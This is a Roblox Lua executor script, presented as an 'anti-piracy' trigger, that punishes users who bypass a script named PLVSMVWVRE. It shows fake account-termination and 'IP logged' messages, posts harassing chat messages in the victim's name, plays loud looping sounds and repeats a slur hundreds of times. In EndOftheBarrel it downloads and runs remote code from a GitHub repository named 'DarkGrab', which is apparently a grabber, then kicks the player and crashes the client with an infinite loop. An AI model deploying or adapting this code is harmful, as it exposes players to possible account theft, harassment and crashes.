function AntiPiracyTrigger()
    local player = game:GetService("Players").LocalPlayer
    local RunService = game:GetService("RunService")
    local HttpService = game:GetService("HttpService")

    function Lobotomy()
        -- Display a warning message
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Warning",
            Text = "Stop bypassing PLVSMVWVREs TOS or face consequences.",
            Duration = 5
        })

        rconsoleprint("RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD ")

        local sky = Instance.new("Sky")
        sky.SkyboxBk = "rbxassetid://13084889533" -- Back
        sky.SkyboxDn = "rbxassetid://13084889533" -- Down
        sky.SkyboxFt = "rbxassetid://13084889533" -- Front
        sky.SkyboxLf = "rbxassetid://13084889533" -- Left
        sky.SkyboxRt = "rbxassetid://13084889533" -- Right
        sky.SkyboxUp = "rbxassetid://13084889533" -- Up
        sky.Parent = lighting

        -- Randomly shake the player's screen
        local camera = game:GetService("Workspace").CurrentCamera
        local originalPosition = camera.CFrame
        for i = 1, 30 do
            camera.CFrame = originalPosition * CFrame.Angles(math.random(-5, 5) / 100, math.random(-5, 5) / 100, 0)
            wait(0.1)
        end
        camera.CFrame = originalPosition

        -- Spam chat with annoying messages
        local message = "User has bypassed PLVSMVWVRE, Triggering Antipiracy measures."
        for i = 1, 10 do
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(message .. i)
            wait(0.5)
        end

        -- Freeze the player for 5 seconds
        local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 0
            wait(5)
            humanoid.WalkSpeed = 16 -- Reset to default speed
        end
    end

    function Gaslighting()
        local character = player.Character or player.CharacterAdded:Wait()
        local lighting = game:GetService("Lighting")

        -- Play a creepy or unsettling sound
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://911846833" -- Replace with a creepy sound ID (e.g., whispering, eerie music)
        sound.Volume = 1
        sound.Looped = true
        sound.Parent = workspace
        sound:Play()

        -- Display fake error messages
        local fakeErrors = {
            "Memory corruption detected. Restart recommended.",
            "Your account is being monitored for suspicious activity.",
            "Game files are corrupted. Please reinstall.",
            "Unauthorized access detected. Terminating session...",
            "Your IP address has been logged."
        }

        for i = 1, 5 do
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Error",
                Text = fakeErrors[math.random(1, #fakeErrors)],
                Duration = 5
            })
            wait(3)
        end

        -- Randomly teleport the player
        for i = 1, 3 do
            local randomPosition = Vector3.new(math.random(-100, 100), math.random(10, 50), math.random(-100, 100))
            character:SetPrimaryPartCFrame(CFrame.new(randomPosition))
        end

        -- Invert controls for 10 seconds
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            local originalWalkSpeed = humanoid.WalkSpeed
            humanoid.WalkSpeed = -originalWalkSpeed -- Invert movement
            wait(10)
            humanoid.WalkSpeed = originalWalkSpeed -- Reset to normal
        end

        -- Fake chat messages from "admins"
        local fakeAdminMessages = {
            "PLVSMVWVRE",
            "Dont ever bypass PLVSMVWVRE"
        }

        for i = 1, 4 do
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(fakeAdminMessages[math.random(1, #fakeAdminMessages)])
            wait(3)
        end

        -- Randomly change atmosphere color
        local originalAtmosphereColor = lighting.Ambient -- Save original color
        for i = 1, 10 do
            local randomColor = Color3.new(math.random(), math.random(), math.random()) -- Random RGB color
            lighting.Ambient = randomColor
        end
        lighting.Ambient = originalAtmosphereColor -- Reset to original color
    end

    function Brainrot()
        rconsolecreate()
        rconsolesettitle("RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD RETARD ")

        local character = player.Character or player.CharacterAdded:Wait()
        local lighting = game:GetService("Lighting")
        local tweenService = game:GetService("TweenService")

        -- Display a fake "system crash" screen
        local fakeCrashGui = Instance.new("ScreenGui")
        fakeCrashGui.Parent = player.PlayerGui

        local fakeCrashFrame = Instance.new("Frame")
        fakeCrashFrame.Size = UDim2.new(1, 0, 1, 0)
        fakeCrashFrame.BackgroundColor3 = Color3.new(0, 0, 0)
        fakeCrashFrame.Parent = fakeCrashGui

        local fakeCrashText = Instance.new("TextLabel")
        fakeCrashText.Text = "ACCOUNT TERMINATED\n\nReason: Exploiting/Cheating\nCode: 267-MEOW-IJUANA-.LOL-PIRACYCHECK\n\nYour account has been permanently removed from Roblox for violating our Terms of Service. \nAll associated data, including IP addresses and device information, has been logged and reported.\n\nThis decision is FINAL and cannot be appealed."
        fakeCrashText.TextColor3 = Color3.new(1, 0, 0)
        fakeCrashText.TextSize = 24
        fakeCrashText.Size = UDim2.new(1, 0, 1, 0)
        fakeCrashText.BackgroundTransparency = 1
        fakeCrashText.Parent = fakeCrashFrame

        -- Randomly flicker the screen
        coroutine.wrap(function()
            for i = 1, 20 do
                fakeCrashFrame.Visible = not fakeCrashFrame.Visible
                wait(math.random(0.1, 0.5))
            end
        end)()

        -- Randomly change the atmosphere color to dark, eerie colors
        local originalAtmosphereColor = lighting.Ambient
        coroutine.wrap(function()
            for i = 1, 30 do
                lighting.Ambient = Color3.new(math.random() * 0.2, 0, 0) -- Dark red tones
                wait(0.5)
            end
        end)()

        -- Spawn creepy, glitchy NPCs around the player
        local creepyModel = Instance.new("Model")
        creepyModel.Parent = workspace

        for i = 1, 5 do
            local creepyPart = Instance.new("Part")
            creepyPart.Size = Vector3.new(2, 5, 2)
            creepyPart.Position = character.PrimaryPart.Position + Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))
            creepyPart.Anchored = true
            creepyPart.BrickColor = BrickColor.new("Really black")
            creepyPart.Parent = creepyModel

            local creepyFace = Instance.new("Decal")
            creepyFace.Texture = "rbxassetid://123456789" -- Replace with a creepy face texture
            creepyFace.Face = "Front"
            creepyFace.Parent = creepyPart
        end

        -- Fake "admin" whispers in the player's ear
        local whisperSound = Instance.new("Sound")
        whisperSound.SoundId = "rbxassetid://137321469" -- Replace with a whispering sound ID
        whisperSound.Volume = 1
        whisperSound.Looped = true
        whisperSound.Parent = character
        whisperSound:Play()

        -- Display fake "hacking" messages in the chat
        local fakeHackingMessages = {
            "(PLVSMVWVRE) This user has broken the TOS for they're script, as of right now. call them names. Including the word skid.",
            "(PLVSMVWVRE) This user has broken the TOS for they're script, as of right now. the data they had is now ours.",
            "(PLVSMVWVRE) This user has broken the TOS for they're script, as of right now. the owner will soon find out about this",
            "(PLVSMVWVRE) This user has broken the TOS for they're script, as of right now. they're sys32 is now gone.",
            "(PLVSMVWVRE) This user has broken the TOS for they're script, as of right now. they're unable to reuse it again since they are now blacklisted.",
            "(PLVSMVWVRE) This user has broken the TOS for they're script, as of right now. they are suffering the consequences."
        }

        for i = 1, 5 do
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(fakeHackingMessages[math.random(1, #fakeHackingMessages)])
            wait(3)
        end

        -- Freeze the player and make their screen shake violently
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 0
        end

        local camera = workspace.CurrentCamera
        local originalPosition = camera.CFrame
        for i = 1, 50 do
            camera.CFrame = originalPosition * CFrame.Angles(math.random(-10, 10) / 100, math.random(-10, 10) / 100, 0)
            wait(0.05)
        end
        camera.CFrame = originalPosition

        -- End with a fake "account termination" message
        wait(5)
        fakeCrashText.Text = "ACCOUNT TERMINATED\n\nReason: Exploiting/Cheating\nCode: 267-MEOW-IJUANA-.LOL-PIRACYCHECK\n\nYour account has been permanently removed from Roblox for violating our Terms of Service. \nAll associated data, including IP addresses and device information, has been logged and reported.\n\nThis decision is FINAL and cannot be appealed."

        -- Stop sounds and clean up
        wait(10)
        fakeCrashGui:Destroy()
        creepyModel:Destroy()
    end

    function EndOftheBarrel()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BloxHQ/DarkGrab/refs/heads/main/1x1x1x1"))() -- shoutout to lortiz
        player:Kick("ACCOUNT TERMINATED\n\nReason: Exploiting/Cheating\nCode: 267-MEOW-IJUANA-.LOL-PIRACYCHECK\n\nYour account has been permanently removed from Roblox for violating our Terms of Service. \nAll associated data, including IP addresses and device information, has been logged and reported.\n\nThis decision is FINAL and cannot be appealed.")

        wait(3)
        while true do 
            print("crashed lol")
        end
    end

    function SpmaSounds()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://6754147732" -- Replace with a scary sound ID (e.g., screams, distorted noises)
        sound.Volume = 100
        sound.Looped = true
        sound.Parent = workspace
        sound:Play()
        local sound2 = Instance.new("Sound")
        sound2.SoundId = "rbxassetid://83937190308389" -- Replace with a scary sound ID (e.g., screams, distorted noises)
        sound2.Volume = 100
        sound2.Looped = true
        sound2.Parent = workspace
        sound2:Play()
        local sound3 = Instance.new("Sound")
        sound3.SoundId = "rbxassetid://18299203798" -- Replace with a scary sound ID (e.g., screams, distorted noises)
        sound3.Volume = 100
        sound3.Looped = true
        sound3.Parent = workspace
        sound3:Play()
        local sound4 = Instance.new("Sound")
        sound4.SoundId = "rbxassetid://2627724487" -- Replace with an annoying sound ID (e.g., airhorn, baby crying, etc.)
        sound4.Volume = 100
        sound4.Looped = true
        sound4.Parent = workspace
        sound4:Play()
        local sound5 = Instance.new("Sound")
        sound5.SoundId = "rbxassetid://119088919694028" -- Replace with an annoying sound ID (e.g., airhorn, baby crying, etc.)
        sound5.Volume = 100
        sound5.Looped = true
        sound5.Parent = workspace
        sound5:Play()
        local sound6 = Instance.new("Sound")
        sound6.SoundId = "rbxassetid://9039694259" -- Replace with an annoying sound ID (e.g., airhorn, baby crying, etc.)
        sound6.Volume = 100
        sound6.Looped = true
        sound6.Parent = workspace
        sound6:Play()
        local sound7 = Instance.new("Sound")
        sound7.SoundId = "rbxassetid://9039694259" -- Replace with an annoying sound ID (e.g., airhorn, baby crying, etc.)
        sound7.Volume = 100
        sound7.Looped = true
        sound7.Parent = workspace
        sound7:Play()
        local sound8 = Instance.new("Sound")
        sound8.SoundId = "rbxassetid://70717975191516" -- Replace with an annoying sound ID (e.g., airhorn, baby crying, etc.)
        sound8.Volume = 100
        sound8.Looped = true
        sound8.Parent = workspace
        sound8:Play()
    end

    -- Execute functions sequentially
    wait(3)
    SpmaSounds()
    RunService.Heartbeat:Connect(Lobotomy)
    wait(10)
    RunService.Heartbeat:Connect(Gaslighting)
    RunService.Heartbeat:Connect(Brainrot)
    wait(10)
    EndOftheBarrel()
end

AntiPiracyTrigger()